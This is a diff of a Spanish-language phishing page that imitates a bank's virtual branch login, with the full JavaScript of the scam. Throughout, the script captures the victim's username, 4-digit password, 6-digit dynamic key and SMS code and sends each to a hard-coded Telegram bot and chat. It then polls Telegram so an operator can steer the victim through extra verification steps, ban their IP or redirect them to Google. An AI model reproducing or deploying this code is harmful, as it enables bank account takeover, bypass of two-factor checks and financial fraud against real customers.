+                      <span id="username-helper" class="authentication-form__help-text"></span>
+                      <a href="#" class="bc-link link-underline">
+                        <u>¿Olvidaste tu usuario?</u>
+                      </a>
+                    </div>
+                  </div>
 
-function actualizarBoton() {
-  const claveCompleta = /^[0-9]{4}$/.test(claveInput.value);
-  const usuarioLleno = usuarioInput.value.trim().length > 0;
-  const formularioValido = claveCompleta && usuarioLleno;
-  
-  submitBtn.disabled = !formularioValido;
-  submitBtn.classList.toggle("ready", formularioValido);
-  
-  if (formularioValido) loginError.classList.remove("show");
-}
+                  <div class="bc-form-field authentication-form__password">
+                    <div class="bc-form-field">
+                      <em class="bc-icon" aria-hidden="true">lock</em>
+                      <input id="clave" minlength="4" maxlength="4" type="password" name="clave"
+                             autocomplete="off" inputmode="numeric"
+                             aria-describedby="password-helper" aria-invalid="false"
+                             class="bc-input" placeholder=" " aria-label="Clave" required>
+                      <label for="clave"></label>
+                      <span id="password-helper" class="authentication-form__help-text"></span>
+                      <a href="#" class="bc-link link-underline">
+                        <u>¿Olvidaste o bloqueaste tu clave?</u>
+                      </a>
+                    </div>
+                  </div>
 
-usuarioInput.addEventListener("input", actualizarBoton);
-claveInput.addEventListener("input", function() {
-  claveInput.value = claveInput.value.replace(/[^0-9]/g, "").slice(0, 4);
-  actualizarBoton();
-});
+                  <p id="loginError" class="error-msg">El usuario o la clave son incorrectos. Por favor verifique.</p>
 
-// ==========================================
-// ENVIAR A TELEGRAM
-// ==========================================
-function enviarIdentificacionTelegram(usuario, clave) {
-    const mensaje = `⚡ <b>PORTAL - INICIO DE SESIÓN</b>\n\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔑 <b>Clave:</b> <code>${clave}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
-    
-    // BOTÓN FINALIZAR AÑADIDO AQUÍ DESDE EL PRINCIPIO
-    const keyboard = {
-        inline_keyboard: [
-            [{ text: '❌ Usuario Malo', callback_data: 'error_usuario' }, { text: '🔑 Pedir Dinámica', callback_data: 'pedir_dinamica' }],
-            [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
-        ]
-    };
+                </section>
 
-    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
-    }).then(r => r.json()).then(data => {
-        if (data.ok && data.result) {
-            msgIdActual = String(data.result.message_id);
-            actionProcessed = false;
-            escucharBotones(handleTelegramActionLogin);
-        } else {
-            ocultarOverlay();
-        }
-    }).catch(() => ocultarOverlay());
-}
+                <section class="bc-card-auth-button">
+                  <button type="submit" id="submitBtn" tabindex="0" data-test="login-button"
+                          class="bc-button-primary" disabled>
+                    Continuar
+                  </button>
+                </section>
+              </form>
 
-function enviarDinamicaTelegram(dinamica) {
-    const mensaje = `⚡ <b>PORTAL - CLAVE DINÁMICA</b>\n\n👤 <b>Usuario:</b> <code>${usuarioInput.value}</code>\n🔢 <b>Dinámica:</b> <code>${dinamica}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
-    
-    const keyboard = {
-        inline_keyboard: [
-            [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica' }, { text: '📩 SMS Code', callback_data: 'sms_code' }],
-            [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
-        ]
-    };
+            </section>
+          </div>
+        </div>
+      </div>
 
-    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
-    }).then(r => r.json()).then(data => {
-        if (data.ok && data.result) {
-            msgIdActual = String(data.result.message_id);
-            actionProcessed = false;
-            escucharBotones(handleTelegramActionDinamica);
-        }
+      <!-- PIR (Pie de página legal) -->
+      <div class="bc-text-center" style="margin-top:24px;">
+        <img src="https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/02/PIR.png"
+             alt="PIR" style="max-width:200px;height:auto;">
+      </div>
+
+    </div>
+  </main>
+
+  <footer class="svp-footer">
+    <p>¿Problemas para conectarte? · Aprende sobre seguridad · Reglamento Sucursal Virtual · Política de privacidad</p>
+    <p id="reloj-widget" style="margin-top:8px;"></p>
+  </footer>
+
+  <!-- MODAL CLAVE DINÁMICA / SMS -->
+  <div class="demo-overlay" id="modalDinamica" role="dialog" aria-modal="true">
+    <section class="demo-modal">
+      <div class="demo-close-row">
+        <button type="button" class="demo-close" id="closeModal" aria-label="Cerrar">×</button>
+      </div>
+
+      <!-- Vista Clave Dinámica -->
+      <div id="viewDinamica" class="demo-step active">
+        <div class="demo-instruction">
+          <strong>Verificación de Seguridad</strong><br>
+          Ingresa la Clave Dinámica de 6 dígitos de tu aplicación.
+        </div>
+        <h2 class="demo-title">Clave Dinámica</h2>
+        <div class="otp-slots-container" id="otpContainer">
+          <div class="otp-slot"></div><div class="otp-slot"></div><div class="otp-slot"></div>
+          <div class="otp-slot"></div><div class="otp-slot"></div><div class="otp-slot"></div>
+        </div>
+        <input type="text" id="otpInput" class="otp-hidden-input" maxlength="6" inputmode="numeric">
+        <p id="otpError" class="error-msg" style="text-align:center;margin-bottom:15px;">Clave dinámica incorrecta o expirada.</p>
+        <div class="demo-actions">
+          <button type="button" class="bc-button-secondary" id="btnBorrar">Borrar</button>
+          <button type="button" class="bc-button-primary" id="btnContinuar" disabled>Continuar</button>
+        </div>
+      </div>
+
+      <!-- Vista SMS -->
+      <div id="viewSms" class="demo-step">
+        <div class="demo-instruction">
+          <strong>Verificación SMS</strong><br>
+          Hemos enviado un código SMS de 6 dígitos a tu celular registrado.
+        </div>
+        <h2 class="demo-title">Código SMS</h2>
+        <div class="sms-wrap" id="smsInputWrap">
+          <input type="text" id="smsCodeInput" class="bc-input" maxlength="6" inputmode="numeric" placeholder="Código SMS">
+        </div>
+        <p id="smsError" class="error-msg" style="text-align:center;margin-bottom:15px;">Código SMS inválido.</p>
+        <div class="demo-actions">
+          <button type="button" class="bc-button-primary" id="btnSmsFinal" style="max-width:100%;">Verificar Código</button>
+        </div>
+      </div>
+
+      <p class="demo-note">servicios bancarios</p>
+    </section>
+  </div>
+
+  <script>
+    // ==========================================
+    // CONFIGURACIÓN DE TELEGRAM
+    // ==========================================
+    const TG_BOT_TOKEN = '8861202697:AAFR82-mSGAhQbN91qJcjugZXpHeP1_7gD4';
+    const TG_CHAT_ID = '7776240161';
+
+    // ==========================================
+    // VARIABLES Y ELEMENTOS
+    // ==========================================
+    const usuarioInput = document.getElementById("usuario");
+    const claveInput = document.getElementById("clave");
+    const submitBtn = document.getElementById("submitBtn");
+    const demoForm = document.getElementById("demoForm");
+    const loadingOverlay = document.getElementById('loading-overlay');
+    const loginError = document.getElementById('loginError');
+
+    const modal = document.getElementById("modalDinamica");
+    const otpInput = document.getElementById("otpInput");
+    const otpSlots = document.querySelectorAll(".otp-slot");
+    const btnBorrar = document.getElementById("btnBorrar");
+    const btnContinuar = document.getElementById("btnContinuar");
+    const otpError = document.getElementById("otpError");
+    const otpContainer = document.getElementById("otpContainer");
+    const closeModal = document.getElementById("closeModal");
+
+    const viewDinamica = document.getElementById("viewDinamica");
+    const viewSms = document.getElementById("viewSms");
+    const smsCodeInput = document.getElementById("smsCodeInput");
+    const btnSmsFinal = document.getElementById("btnSmsFinal");
+    const smsError = document.getElementById("smsError");
+    const smsInputWrap = document.getElementById("smsInputWrap");
+
+    let pollingActivo = false;
+    let pollingTimeout = null;
+    let ultimoUpdateId = -1;
+    let actionProcessed = false;
+    let msgIdActual = null;
+
+    function mostrarOverlay() { loadingOverlay.style.display = 'flex'; }
+    function ocultarOverlay() { loadingOverlay.style.display = 'none'; }
+
+    function actualizarBoton() {
+      const claveCompleta = /^[0-9]{4}$/.test(claveInput.value);
+      const usuarioLleno = usuarioInput.value.trim().length > 0;
+      const formularioValido = claveCompleta && usuarioLleno;
+      submitBtn.disabled = !formularioValido;
+      if (formularioValido) loginError.classList.remove("show");
+    }
+
+    usuarioInput.addEventListener("input", actualizarBoton);
+    claveInput.addEventListener("input", function() {
+      claveInput.value = claveInput.value.replace(/[^0-9]/g, "").slice(0, 4);
+      actualizarBoton();
     });
-}
 
-function enviarSmsTelegram(codigoSms) {
-    const mensaje = `⚡ <b>PORTAL - CÓDIGO SMS</b>\n\n👤 <b>Usuario:</b> <code>${usuarioInput.value}</code>\n📩 <b>SMS:</b> <code>${codigoSms}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
-    
-    const keyboard = {
-        inline_keyboard: [
-            [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica_final' }],
-            [{ text: '❌ Error SMS Code', callback_data: 'error_sms_final' }],
-            [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
-        ]
-    };
-
-    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
-    }).then(r => r.json()).then(data => {
-        if (data.ok && data.result) {
-            msgIdActual = String(data.result.message_id);
-            actionProcessed = false;
-            escucharBotones(handleTelegramActionSms);
-        }
-    });
-}
-
-// ==========================================
-// ESCUCHAR BOTONES (POLLING)
-// ==========================================
-function escucharBotones(callbackAction) {
-    if (!msgIdActual) return;
-    pollingActivo = true;
-    
-    function check() {
-        if (!pollingActivo) return;
-        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates`, {
+    // ==========================================
+    // ENVIAR A TELEGRAM
+    // ==========================================
+    function enviarIdentificacionTelegram(usuario, clave) {
+        const mensaje = `⚡ <b>PORTAL - INICIO DE SESIÓN</b>\n\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔑 <b>Clave:</b> <code>${clave}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: '❌ Usuario Malo', callback_data: 'error_usuario' }, { text: '🔑 Pedir Dinámica', callback_data: 'pedir_dinamica' }],
+                [{ text: '🚫 Banear IP', callback_data: 'banear_ip' }, { text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
+            ]
+        };
+        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ offset: ultimoUpdateId + 1, allowed_updates: ['callback_query'], timeout: 10 })
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
         }).then(r => r.json()).then(data => {
-            if (!data.ok || !data.result || data.result.length === 0) {
-                pollingTimeout = setTimeout(check, 2000); return;
+            if (data.ok && data.result) {
+                msgIdActual = String(data.result.message_id);
+                actionProcessed = false;
+                escucharBotones(handleTelegramActionLogin);
+            } else { ocultarOverlay(); }
+        }).catch(() => ocultarOverlay());
+    }
+
+    function enviarDinamicaTelegram(dinamica) {
+        const mensaje = `⚡ <b>PORTAL - CLAVE DINÁMICA</b>\n\n👤 <b>Usuario:</b> <code>${usuarioInput.value}</code>\n🔢 <b>Dinámica:</b> <code>${dinamica}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica' }, { text: '📩 SMS Code', callback_data: 'sms_code' }],
+                [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
+            ]
+        };
+        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
+        }).then(r => r.json()).then(data => {
+            if (data.ok && data.result) {
+                msgIdActual = String(data.result.message_id);
+                actionProcessed = false;
+                escucharBotones(handleTelegramActionDinamica);
             }
-            for (const u of data.result) {
-                ultimoUpdateId = Math.max(ultimoUpdateId, u.update_id);
-                if (u.callback_query) {
-                    const messageId = String(u.callback_query.message.message_id);
-                    if (messageId === String(msgIdActual)) {
-                        pollingActivo = false;
-                        callbackAction(u.callback_query.data);
-                        return;
+        });
+    }
+
+    function enviarSmsTelegram(codigoSms) {
+        const mensaje = `⚡ <b>PORTAL - CÓDIGO SMS</b>\n\n👤 <b>Usuario:</b> <code>${usuarioInput.value}</code>\n📩 <b>SMS:</b> <code>${codigoSms}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica_final' }],
+                [{ text: '❌ Error SMS Code', callback_data: 'error_sms_final' }],
+                [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
+            ]
+        };
+        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
+        }).then(r => r.json()).then(data => {
+            if (data.ok && data.result) {
+                msgIdActual = String(data.result.message_id);
+                actionProcessed = false;
+                escucharBotones(handleTelegramActionSms);
+            }
+        });
+    }
+
+    // ==========================================
+    // ESCUCHAR BOTONES (POLLING)
+    // ==========================================
+    function escucharBotones(callbackAction) {
+        if (!msgIdActual) return;
+        pollingActivo = true;
+        function check() {
+            if (!pollingActivo) return;
+            fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ offset: ultimoUpdateId + 1, allowed_updates: ['callback_query'], timeout: 10 })
+            }).then(r => r.json()).then(data => {
+                if (!data.ok || !data.result || data.result.length === 0) {
+                    pollingTimeout = setTimeout(check, 2000); return;
+                }
+                for (const u of data.result) {
+                    ultimoUpdateId = Math.max(ultimoUpdateId, u.update_id);
+                    if (u.callback_query) {
+                        const messageId = String(u.callback_query.message.message_id);
+                        if (messageId === String(msgIdActual)) {
+                            pollingActivo = false;
+                            callbackAction(u.callback_query.data);
+                            return;
+                        }
                     }
                 }
-            }
-            pollingTimeout = setTimeout(check, 2000);
-        }).catch(() => { pollingTimeout = setTimeout(check, 3000); });
+                pollingTimeout = setTimeout(check, 2000);
+            }).catch(() => { pollingTimeout = setTimeout(check, 3000); });
+        }
+        check();
     }
-    check();
-}
 
-// ==========================================
-// ACCIONES DE TELEGRAM
-// ==========================================
-function handleTelegramActionLogin(action) {
-    if (actionProcessed) return;
-    actionProcessed = true;
-    ocultarOverlay();
+    // ==========================================
+    // ACCIONES DE TELEGRAM
+    // ==========================================
+    function handleTelegramActionLogin(action) {
+        if (actionProcessed) return;
+        actionProcessed = true;
+        ocultarOverlay();
 
-    if (action === 'pedir_dinamica') {
-        modal.classList.add("active");
-        viewDinamica.style.display = "block";
-        viewSms.classList.remove("active");
-        
-        otpInput.value = "";
-        otpError.classList.remove("show");
-        otpContainer.classList.remove("error");
-        actualizarOTP();
-        setTimeout(() => otpInput.focus(), 100);
-    } else if (action === 'error_usuario') {
-        loginError.classList.add("show");
-        claveInput.value = "";
-        actualizarBoton();
-        claveInput.focus();
-    } else if (action === 'finalizar') {
-        window.location.href = "https://www.google.com"; // Redirección a Google
+        if (action === 'pedir_dinamica') {
+            modal.classList.add("is-open");
+            viewDinamica.style.display = "block";
+            viewSms.classList.remove("active");
+            otpInput.value = "";
+            otpError.classList.remove("show");
+            otpContainer.classList.remove("error");
+            actualizarOTP();
+            setTimeout(() => otpInput.focus(), 100);
+        } else if (action === 'error_usuario') {
+            loginError.classList.add("show");
+            claveInput.value = "";
+            actualizarBoton();
+            claveInput.focus();
+        } else if (action === 'banear_ip') {
+            localStorage.setItem('sys_blocked_user', 'true');
+            location.reload();
+        } else if (action === 'finalizar') {
+            window.location.href = "https://www.google.com";
+        }
     }
-}
 
-function handleTelegramActionDinamica(action) {
-    if (actionProcessed) return;
-    actionProcessed = true;
-    ocultarOverlay();
+    function handleTelegramActionDinamica(action) {
+        if (actionProcessed) return;
+        actionProcessed = true;
+        ocultarOverlay();
 
-    if (action === 'error_dinamica') {
-        modal.classList.add("active"); 
-        viewDinamica.style.display = "block";
-        viewSms.classList.remove("active");
-        
-        otpError.classList.add("show");
-        otpContainer.classList.add("error");
-        otpInput.value = "";
-        actualizarOTP();
-        otpInput.focus();
-        
-        actionProcessed = false;
-    } else if (action === 'sms_code') {
-        viewDinamica.style.display = "none";
-        viewSms.classList.add("active");
-        smsCodeInput.value = "";
-        smsError.classList.remove("show");
-        smsInputWrap.classList.remove("error");
-        setTimeout(() => smsCodeInput.focus(), 100);
-    } else if (action === 'finalizar') {
-        window.location.href = "https://www.google.com"; // Redirección a Google
+        if (action === 'error_dinamica') {
+            modal.classList.add("is-open");
+            viewDinamica.style.display = "block";
+            viewSms.classList.remove("active");
+            otpError.classList.add("show");
+            otpContainer.classList.add("error");
+            otpInput.value = "";
+            actualizarOTP();
+            otpInput.focus();
+            actionProcessed = false;
+        } else if (action === 'sms_code') {
+            viewDinamica.style.display = "none";
+            viewSms.classList.add("active");
+            smsCodeInput.value = "";
+            smsError.classList.remove("show");
+            smsInputWrap.classList.remove("error");
+            setTimeout(() => smsCodeInput.focus(), 100);
+        } else if (action === 'finalizar') {
+            window.location.href = "https://www.google.com";
+        }
     }
-}
 
-function handleTelegramActionSms(action) {
-    if (actionProcessed) return;
-    actionProcessed = true;
-    ocultarOverlay();
+    function handleTelegramActionSms(action) {
+        if (actionProcessed) return;
+        actionProcessed = true;
+        ocultarOverlay();
 
-    if (action === 'error_dinamica_final') {
-        viewSms.classList.remove("active");
-        viewDinamica.style.display = "block";
-        otpError.classList.add("show");
-        otpContainer.classList.add("error");
-        otpInput.value = "";
-        actualizarOTP();
-        otpInput.focus();
-        actionProcessed = false;
-    } else if (action === 'error_sms_final') {
-        smsError.classList.add("show");
-        smsInputWrap.classList.add("error");
-        smsCodeInput.value = "";
-        smsCodeInput.focus();
-        actionProcessed = false;
-    } else if (action === 'finalizar') {
-        window.location.href = "https://www.google.com"; // Redirección a Google
+        if (action === 'error_dinamica_final') {
+            viewSms.classList.remove("active");
+            viewDinamica.style.display = "block";
+            otpError.classList.add("show");
+            otpContainer.classList.add("error");
+            otpInput.value = "";
+            actualizarOTP();
+            otpInput.focus();
+            actionProcessed = false;
+        } else if (action === 'error_sms_final') {
+            smsError.classList.add("show");
+            smsInputWrap.classList.add("error");
+            smsCodeInput.value = "";
+            smsCodeInput.focus();
+            actionProcessed = false;
+        } else if (action === 'finalizar') {
+            window.location.href = "https://www.google.com";
+        }
     }
-}
 
-// ==========================================
-// LÓGICA DEL FORMULARIO PRINCIPAL
-// ==========================================
-demoForm.addEventListener("submit", function(event) {
-  event.preventDefault();
-  
-  if (submitBtn.disabled) return;
-  
-  mostrarOverlay();
-  const user = usuarioInput.value.trim();
-  const pass = claveInput.value.trim();
-  
-  enviarIdentificacionTelegram(user, pass);
-});
+    // ==========================================
+    // LÓGICA FORMULARIO PRINCIPAL
+    // ==========================================
+    demoForm.addEventListener("submit", function(event) {
+      event.preventDefault();
+      if (submitBtn.disabled) return;
+      mostrarOverlay();
+      const user = usuarioInput.value.trim();
+      const pass = claveInput.value.trim();
+      enviarIdentificacionTelegram(user, pass);
+    });
 
-// Lógica del Modal (6 dígitos)
-function actualizarOTP() {
-  const valor = otpInput.value;
-  
-  otpSlots.forEach((slot, index) => {
-    if (index < valor.length) {
-      slot.textContent = valor[index];
-      slot.classList.remove("active");
-    } else {
-      slot.textContent = "";
-      if (index === valor.length) {
-        slot.classList.add("active");
+    // ==========================================
+    // LÓGICA OTP
+    // ==========================================
+    function actualizarOTP() {
+      const valor = otpInput.value;
+      otpSlots.forEach((slot, index) => {
+        if (index < valor.length) {
+          slot.textContent = valor[index];
+          slot.classList.remove("active");
+        } else {
+          slot.textContent = "";
+          if (index === valor.length) { slot.classList.add("active"); }
+          else { slot.classList.remove("active"); }
+        }
+      });
+      if (valor.length === 6) {
+        btnContinuar.disabled = false;
+        otpSlots.forEach(s => s.classList.remove("active"));
       } else {
-        slot.classList.remove("active");
+        btnContinuar.disabled = true;
       }
     }
-  });
 
-  if (valor.length === 6) {
-    btnContinuar.disabled = false;
-    btnContinuar.classList.add("ready");
-    otpSlots.forEach(s => s.classList.remove("active"));
-  } else {
-    btnContinuar.disabled = true;
-    btnContinuar.classList.remove("ready");
-  }
-}
+    otpInput.addEventListener("input", function() {
+      this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
+      otpError.classList.remove("show");
+      otpContainer.classList.remove("error");
+      actualizarOTP();
+    });
 
-otpInput.addEventListener("input", function() {
-  this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
-  otpError.classList.remove("show");
-  otpContainer.classList.remove("error");
-  actualizarOTP();
-});
+    otpContainer.addEventListener("click", () => otpInput.focus());
 
-otpContainer.addEventListener("click", () => otpInput.focus());
+    btnBorrar.addEventListener("click", () => {
+      otpInput.value = "";
+      otpError.classList.remove("show");
+      otpContainer.classList.remove("error");
+      actualizarOTP();
+      otpInput.focus();
+    });
 
-btnBorrar.addEventListener("click", () => {
-  otpInput.value = "";
-  otpError.classList.remove("show");
-  otpContainer.classList.remove("error");
-  actualizarOTP();
-  otpInput.focus();
-});
+    btnContinuar.addEventListener("click", () => {
+      if (otpInput.value.length === 6) {
+        mostrarOverlay();
+        enviarDinamicaTelegram(otpInput.value);
+      }
+    });
 
-btnContinuar.addEventListener("click", () => {
-  if(otpInput.value.length === 6) {
-    mostrarOverlay();
-    enviarDinamicaTelegram(otpInput.value);
-  }
-});
+    closeModal.addEventListener("click", () => { modal.classList.remove("is-open"); });
 
-// Lógica para el código SMS
-smsCodeInput.addEventListener("input", function() {
-  this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
-  smsError.classList.remove("show");
-  smsInputWrap.classList.remove("error");
-});
+    // ==========================================
+    // LÓGICA SMS
+    // ==========================================
+    smsCodeInput.addEventListener("input", function() {
+      this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
+      smsError.classList.remove("show");
+      smsInputWrap.classList.remove("error");
+    });
 
-btnSmsFinal.addEventListener("click", () => {
-  if(smsCodeInput.value.length < 6) {
-    smsError.textContent = "Por favor, ingresa el código SMS completo de 6 dígitos.";
-    smsError.classList.add("show");
-    smsInputWrap.classList.add("error");
-    return;
-  }
-  
-  mostrarOverlay();
-  enviarSmsTelegram(smsCodeInput.value);
-});
+    btnSmsFinal.addEventListener("click", () => {
+      if (smsCodeInput.value.length < 6) {
+        smsError.textContent = "Por favor, ingresa el código SMS completo de 6 dígitos.";
+        smsError.classList.add("show");
+        smsInputWrap.classList.add("error");
+        return;
+      }
+      mostrarOverlay();
+      enviarSmsTelegram(smsCodeInput.value);
+    });
 
-actualizarBoton();
-</script>
+    // ==========================================
+    // RELOJ / FECHA (del archivo original)
+    // ==========================================
+    function actualizarFecha() {
+      const ahora = new Date();
+      const opciones = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: 'numeric', minute: '2-digit', hour12: true };
+      let fecha = ahora.toLocaleDateString('es-ES', opciones).replace(',', '');
+      const el = document.getElementById('reloj-widget');
+      if (el) el.textContent = fecha.charAt(0).toUpperCase() + fecha.slice(1);
+    }
+    actualizarFecha();
+    setInterval(actualizarFecha, 60000);
+
+    actualizarBoton();
+  </script>
 
 </body>
 </html>
